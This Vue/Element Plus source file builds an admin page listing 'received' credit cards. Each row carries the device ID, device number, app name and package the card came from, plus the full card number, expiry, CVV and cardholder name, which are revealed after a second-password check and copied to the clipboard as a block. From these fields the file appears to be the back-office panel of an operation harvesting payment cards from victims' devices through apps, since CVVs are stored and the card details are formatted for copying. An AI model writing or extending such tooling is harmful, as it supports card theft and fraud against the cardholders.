<template>
  <div class="table-box" v-loading="loading" element-loading-text="加载中...">
    <ProTable
      ref="proTable"
      title="信用卡列表"
      row-key="id"
      :columns="columns"
      :request-api="getReceiveCardsListWithLoading"
      :init-param="initParam"
      :data-callback="dataCallback"
    >
      <!-- 设备号内容 -->
      <template #device_number="scope">
        <div class="device-number-text">{{ scope.row.device_number || "-" }}</div>
      </template>
      <!-- 卡号内容 -->
      <template #card_number="scope">
        <div class="card-number-text">
          {{ verifiedRows.has(scope.row.id) ? (scope.row.card_number || "-") : "***" }}
        </div>
      </template>
      <!-- 卡日期内容 -->
      <template #card_date="scope">
        <div class="card-date-text">
          {{ verifiedRows.has(scope.row.id) ? (scope.row.card_date || "-") : "***" }}
        </div>
      </template>
      <!-- CVV内容 -->
      <template #cvv="scope">
        <div class="cvv-text">
          {{ verifiedRows.has(scope.row.id) ? (scope.row.cvv || "-") : "***" }}
        </div>
      </template>
      <!-- 用户名内容 -->
      <template #user_name="scope">
        <div class="user-name-text">
          {{ verifiedRows.has(scope.row.id) 
            ? ((scope.row.user_first_name || "") + " " + (scope.row.user_last_name || "")).trim() || "-"
            : "***" }}
        </div>
      </template>
      <!-- 操作 -->
      <template #operation="scope">
        <el-button 
          v-if="!verifiedRows.has(scope.row.id)"
          type="primary" 
          link 
          :icon="View" 
          @click="handleView(scope.row)"
        >
          查看
        </el-button>
        <el-button 
          v-else
          type="primary" 
          link 
          :icon="CopyDocument" 
          @click="handleCopy(scope.row)"
        >
          复制
        </el-button>
      </template>
    </ProTable>
    <!-- 二次密码验证弹窗 -->
    <el-dialog v-model="passwordDialogVisible" title="二次密码验证" width="400px">
      <el-form :model="passwordForm" :rules="passwordRules" ref="passwordFormRef" label-width="100px">
        <el-form-item label="二次密码" prop="password">
          <el-input
            v-model="passwordForm.password"
            type="password"
            placeholder="请输入二次密码"
            show-password
            @keyup.enter="handleVerifyPassword"
          />
        </el-form-item>
      </el-form>
      <template #footer>
        <el-button @click="passwordDialogVisible = false">取消</el-button>
        <el-button type="primary" :loading="verifying" @click="handleVerifyPassword">确定</el-button>
      </template>
    </el-dialog>
  </div>
</template>

<script setup lang="ts" name="receiveCards">
import { ref, reactive } from "vue";
import type { FormInstance, FormRules } from "element-plus";
import { ColumnProps, ProTableInstance } from "@/components/ProTable/interface";
import { View, CopyDocument } from "@element-plus/icons-vue";
import ProTable from "@/components/ProTable/index.vue";
import {
  getReceiveCardsListApi,
  getReceiveCardsInfoApi,
  ReceiveCardsItem,
  ReceiveCardsListResponse
} from "@/api/modules/receiveCards";
import { verifySecondPasswordApi } from "@/api/modules/login";
import { ElMessage } from "element-plus";

const proTable = ref<ProTableInstance>();
const loading = ref(false);
const passwordDialogVisible = ref(false);
const verifying = ref(false);
const passwordFormRef = ref<FormInstance>();
const currentRow = ref<ReceiveCardsItem | null>(null);
const verifiedRows = ref<Set<number>>(new Set());

const passwordForm = reactive({
  password: ""
});

const passwordRules = reactive<FormRules>({
  password: [{ required: true, message: "请输入二次密码", trigger: "blur" }]
});

// 初始化参数
const initParam = reactive({
  page: 1,
  limit: 20
});

// 带加载状态的信用卡列表请求
const getReceiveCardsListWithLoading = async (params?: any) => {
  loading.value = true;
  try {
    const result = await getReceiveCardsListApi(params);
    return result;
  } finally {
    loading.value = false;
  }
};

// 数据回调处理
const dataCallback = (data: ReceiveCardsListResponse) => {
  return {
    list: data.list || [],
    total: data.total_num || 0
  };
};

// 表格配置项
const columns = reactive<ColumnProps<ReceiveCardsItem>[]>([
  { prop: "id", label: "ID", width: 80 },
  { 
    prop: "device_id", 
    label: "设备ID", 
    width: 120,
    search: { el: "input", props: { placeholder: "请输入设备ID" } } 
  },
  { 
    prop: "device_number", 
    label: "设备号", 
    minWidth: 150, 
    showOverflowTooltip: false,
    search: { el: "input", props: { placeholder: "请输入设备号" } } 
  },
  { 
    prop: "app_name", 
    label: "APP名称", 
    width: 150, 
    search: { el: "input", props: { placeholder: "请输入APP名称" } } 
  },
  { 
    prop: "app_package", 
    label: "APP包名", 
    width: 200, 
    search: { el: "input", props: { placeholder: "请输入APP包名" } } 
  },
  { 
    prop: "card_number", 
    label: "卡号", 
    minWidth: 200,
    showOverflowTooltip: false
  },
  { 
    prop: "card_date", 
    label: "卡日期", 
    width: 120
  },
  { 
    prop: "cvv", 
    label: "CVV", 
    width: 100
  },
  { 
    prop: "user_name", 
    label: "用户名", 
    width: 150
  },
  { prop: "created_at", label: "创建时间", width: 180 },
  { prop: "operation", label: "操作", width: 120, fixed: "right" }
]);

// 处理查看按钮点击
const handleView = (row: ReceiveCardsItem) => {
  currentRow.value = row;
  passwordForm.password = "";
  passwordDialogVisible.value = true;
};

// 复制信用卡信息
const handleCopy = async (row: ReceiveCardsItem) => {
  const cardInfo = [
    `卡号: ${row.card_number || "-"}`,
    `日期: ${row.card_date || "-"}`,
    `CVV: ${row.cvv || "-"}`,
    `用户名: ${((row.user_first_name || "") + " " + (row.user_last_name || "")).trim() || "-"}`
  ].join("\n");
  
  if (!cardInfo) {
    ElMessage.warning("信用卡信息为空");
    return;
  }
  
  try {
    await navigator.clipboard.writeText(cardInfo);
    ElMessage.success("复制成功");
  } catch (err) {
    // 降级方案：使用传统方法
    const textArea = document.createElement("textarea");
    textArea.value = cardInfo;
    textArea.style.position = "fixed";
    textArea.style.left = "-999999px";
    textArea.style.top = "-999999px";
    document.body.appendChild(textArea);
    textArea.focus();
    textArea.select();
    try {
      document.execCommand("copy");
      ElMessage.success("复制成功");
    } catch (err) {
      ElMessage.error("复制失败，请手动复制");
    }
    document.body.removeChild(textArea);
  }
};

// 验证二次密码
const handleVerifyPassword = async () => {
  // 防止重复点击
  if (verifying.value) return;
  
  if (!passwordFormRef.value) return;
  
  try {
    // 先进行表单验证
    await passwordFormRef.value.validate();
    
    // 验证通过后，设置加载状态
    verifying.value = true;
    
    try {
      await verifySecondPasswordApi({ password: passwordForm.password });
      // 验证成功，重新获取该行的详细数据
      if (currentRow.value) {
        try {
          const res = await getReceiveCardsInfoApi(currentRow.value.id);
          const updatedData = (res as any)?.data || res;
          // 更新表格中该行的数据
          if (proTable.value) {
            const tableData = proTable.value.tableData || [];
            const index = tableData.findIndex((item: ReceiveCardsItem) => item.id === currentRow.value!.id);
            if (index !== -1 && updatedData) {
              // 更新该行的数据
              Object.assign(tableData[index], updatedData);
              verifiedRows.value.add(currentRow.value.id);
            }
          }
        } catch (error) {
          console.error("获取信用卡详情失败:", error);
        }
      }
      passwordDialogVisible.value = false;
      passwordForm.password = "";
      ElMessage.success("验证成功");
    } catch (error) {
      // 错误信息已由HTTP拦截器统一处理，这里不需要再次提示
    } finally {
      verifying.value = false;
    }
  } catch (error) {
    // 表单验证失败，不需要处理，Element Plus会自动显示错误信息
    // 确保verifying状态被重置（虽然此时应该是false，但为了安全起见）
    verifying.value = false;
  }
};
</script>

<style scoped lang="scss">
.device-number-text {
  word-break: break-all;
  white-space: normal;
  line-height: 1.5;
}

.card-number-text {
  word-break: break-all;
  white-space: normal;
  line-height: 1.5;
}

.card-date-text {
  word-break: break-all;
  white-space: normal;
  line-height: 1.5;
}

.cvv-text {
  word-break: break-all;
  white-space: normal;
  line-height: 1.5;
}

.user-name-text {
  word-break: break-all;
  white-space: normal;
  line-height: 1.5;
}
</style>

